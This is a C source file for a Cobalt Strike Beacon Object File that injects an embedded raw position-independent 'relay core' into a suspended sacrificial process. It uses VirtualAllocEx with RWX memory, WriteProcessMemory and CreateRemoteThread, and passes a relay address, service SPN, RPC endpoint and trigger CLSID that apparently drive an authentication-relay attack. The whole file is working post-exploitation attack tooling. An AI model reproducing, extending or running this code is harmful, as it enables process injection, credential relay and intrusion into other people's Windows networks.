#include <windows.h>
#include "beacon.h"

/*
 * This is the only component that runs inline in Beacon. Beacon can already
 * have immutable process-wide COM security, so the launcher deliberately does
 * not initialize COM. It creates an operator-selected process suspended,
 * copies the raw relay core and arguments there, starts one remote thread,
 * captures diagnostics through an inherited pipe, and terminates that
 * sacrificial process on every exit path.
 */

#define BOF_IMPORT(dll, ret, call, name, args) DECLSPEC_IMPORT ret call dll##$##name args
BOF_IMPORT(KERNEL32, HANDLE, WINAPI, GetProcessHeap, (void));
BOF_IMPORT(KERNEL32, LPVOID, WINAPI, HeapAlloc, (HANDLE,DWORD,SIZE_T));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, HeapFree, (HANDLE,DWORD,LPVOID));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, CreatePipe, (PHANDLE,PHANDLE,LPSECURITY_ATTRIBUTES,DWORD));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, SetHandleInformation, (HANDLE,DWORD,DWORD));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, CloseHandle, (HANDLE));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, CreateProcessA, (LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION));
BOF_IMPORT(KERNEL32, LPVOID, WINAPI, VirtualAllocEx, (HANDLE,LPVOID,SIZE_T,DWORD,DWORD));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, WriteProcessMemory, (HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, FlushInstructionCache, (HANDLE,LPCVOID,SIZE_T));
BOF_IMPORT(KERNEL32, HANDLE, WINAPI, CreateRemoteThread, (HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD));
BOF_IMPORT(KERNEL32, DWORD, WINAPI, WaitForSingleObject, (HANDLE,DWORD));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, GetExitCodeThread, (HANDLE,LPDWORD));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, TerminateProcess, (HANDLE,UINT));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, ReadFile, (HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED));
BOF_IMPORT(KERNEL32, DWORD, WINAPI, GetLastError, (void));

extern const unsigned char *embedded_pic_core(void);
extern unsigned embedded_pic_core_size(void);

static void copy_bytes(void *destination,const void *source,unsigned length){unsigned i;for(i=0;i<length;i++)((unsigned char*)destination)[i]=((const unsigned char*)source)[i];}
static void zero_bytes(void *destination,unsigned length){unsigned i;for(i=0;i<length;i++)((unsigned char*)destination)[i]=0;}
static void put_u32(unsigned char *p,unsigned value){p[0]=(unsigned char)value;p[1]=(unsigned char)(value>>8);p[2]=(unsigned char)(value>>16);p[3]=(unsigned char)(value>>24);}

void go(char *args,unsigned long alen){
    const unsigned char *core=embedded_pic_core();unsigned core_size=embedded_pic_core_size(),core_args_len,total,cursor,i;unsigned char *payload=NULL;LPVOID remote=NULL;
    SIZE_T wrote=0;HANDLE remote_thread=NULL,pipe_read=NULL,pipe_write=NULL;char output[768],process[520],*selected_process,*field[6];int selected_len=0,field_len[6],relay_port;DWORD got,wait_result,thread_status=STILL_ACTIVE;
    STARTUPINFOA si;PROCESS_INFORMATION pi;SECURITY_ATTRIBUTES sa;datap parser;

    /* Reject malformed input before creating a process or touching memory in
       another process. The initial string is the selected process command. */
    zero_bytes(&si,sizeof(si));zero_bytes(&pi,sizeof(pi));zero_bytes(&sa,sizeof(sa));zero_bytes(process,sizeof(process));
    if(!args||alen<12||alen>4096||!core_size){BeaconPrintf(CALLBACK_ERROR,"[-] Invalid direct-PIC relay parameters\n");return;}
    BeaconDataParse(&parser,args,(int)alen);selected_process=BeaconDataExtract(&parser,&selected_len);
    if(!selected_process||selected_len<2||selected_len>(int)sizeof(process)){BeaconPrintf(CALLBACK_ERROR,"[-] Invalid sacrificial process command\n");return;}
    copy_bytes(process,selected_process,(unsigned)selected_len);process[selected_len-1]=0;
    field[0]=BeaconDataExtract(&parser,&field_len[0]);relay_port=BeaconDataInt(&parser);
    for(i=1;i<6;i++)field[i]=BeaconDataExtract(&parser,&field_len[i]);
    if(relay_port<1||relay_port>65535){BeaconPrintf(CALLBACK_ERROR,"[-] Invalid relay port\n");return;}
    /* Repack the remaining fields in the ordinary BOF length-prefixed format:
       relay address/port, service SPN, RPC address/endpoint, trigger CLSID,
       and the per-run bridge nonce. */
    core_args_len=4;
    for(i=0;i<6;i++){if(!field[i]||field_len[i]<2||field_len[i]>512){BeaconPrintf(CALLBACK_ERROR,"[-] Invalid relay-core field %u\n",i+1);return;}core_args_len+=4+(unsigned)field_len[i];}
    total=core_size+4+core_args_len;payload=KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(),0,total);if(!payload)return;
    copy_bytes(payload,core,core_size);put_u32(payload+core_size,core_args_len);cursor=core_size+4;
    put_u32(payload+cursor,(unsigned)field_len[0]);cursor+=4;copy_bytes(payload+cursor,field[0],(unsigned)field_len[0]);cursor+=(unsigned)field_len[0];
    put_u32(payload+cursor,(unsigned)relay_port);cursor+=4;
    for(i=1;i<6;i++){put_u32(payload+cursor,(unsigned)field_len[i]);cursor+=4;copy_bytes(payload+cursor,field[i],(unsigned)field_len[i]);cursor+=(unsigned)field_len[i];}

    /* Only the pipe's write handle is inherited by the disposable child. */
    si.cb=sizeof(si);sa.nLength=sizeof(sa);sa.bInheritHandle=TRUE;
    if(!KERNEL32$CreatePipe(&pipe_read,&pipe_write,&sa,0)||!KERNEL32$SetHandleInformation(pipe_read,HANDLE_FLAG_INHERIT,0))goto done;
    si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;si.wShowWindow=SW_HIDE;si.hStdOutput=pipe_write;si.hStdError=pipe_write;
    BeaconPrintf(CALLBACK_OUTPUT,"[*] Raw-PIC launcher v11-session-bound\n[*] Spawning caller-selected sacrificial process for direct raw-PIC injection: %s\n",process);
    if(!KERNEL32$CreateProcessA(NULL,process,NULL,NULL,TRUE,CREATE_SUSPENDED|CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){BeaconPrintf(CALLBACK_ERROR,"[-] Sacrificial process creation failed (%lu)\n",KERNEL32$GetLastError());goto done;}
    /* Layout: [raw PIC][argument length][argument block]. The thread starts at
       raw PIC offset zero and lpParameter points to the length field. */
    remote=KERNEL32$VirtualAllocEx(pi.hProcess,NULL,total,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if(!remote||!KERNEL32$WriteProcessMemory(pi.hProcess,remote,payload,total,&wrote)||wrote!=total||!KERNEL32$FlushInstructionCache(pi.hProcess,remote,total)){BeaconPrintf(CALLBACK_ERROR,"[-] Direct raw-PIC materialization failed (%lu)\n",KERNEL32$GetLastError());goto child_done;}
    remote_thread=KERNEL32$CreateRemoteThread(pi.hProcess,NULL,0,(LPTHREAD_START_ROUTINE)remote,(unsigned char*)remote+core_size,0,NULL);
    if(!remote_thread){BeaconPrintf(CALLBACK_ERROR,"[-] Direct raw-PIC thread creation failed (%lu)\n",KERNEL32$GetLastError());goto child_done;}
    KERNEL32$CloseHandle(pipe_write);pipe_write=NULL;wait_result=KERNEL32$WaitForSingleObject(remote_thread,60000);KERNEL32$GetExitCodeThread(remote_thread,&thread_status);
    /* The watchdog protects Beacon from an RPC operation which never returns. */
    if(wait_result==WAIT_TIMEOUT){BeaconPrintf(CALLBACK_ERROR,"[-] Direct raw-PIC relay timed out after 60 seconds\n");KERNEL32$TerminateProcess(pi.hProcess,124);}else BeaconPrintf(thread_status?CALLBACK_ERROR:CALLBACK_OUTPUT,"[*] Direct raw-PIC relay returned status 0x%08lx\n",thread_status);
child_done:
    if(pi.hProcess)KERNEL32$TerminateProcess(pi.hProcess,0);if(remote_thread)KERNEL32$CloseHandle(remote_thread);if(pi.hThread)KERNEL32$CloseHandle(pi.hThread);if(pi.hProcess)KERNEL32$CloseHandle(pi.hProcess);
    /* Drain output after helper termination so writes cannot race callbacks. */
    while(pipe_read&&KERNEL32$ReadFile(pipe_read,output,sizeof(output)-1,&got,NULL)&&got){output[got]=0;BeaconPrintf(CALLBACK_OUTPUT,"%s",output);}
done:
    if(pipe_read)KERNEL32$CloseHandle(pipe_read);if(pipe_write)KERNEL32$CloseHandle(pipe_write);if(payload)KERNEL32$HeapFree(KERNEL32$GetProcessHeap(),0,payload);
}
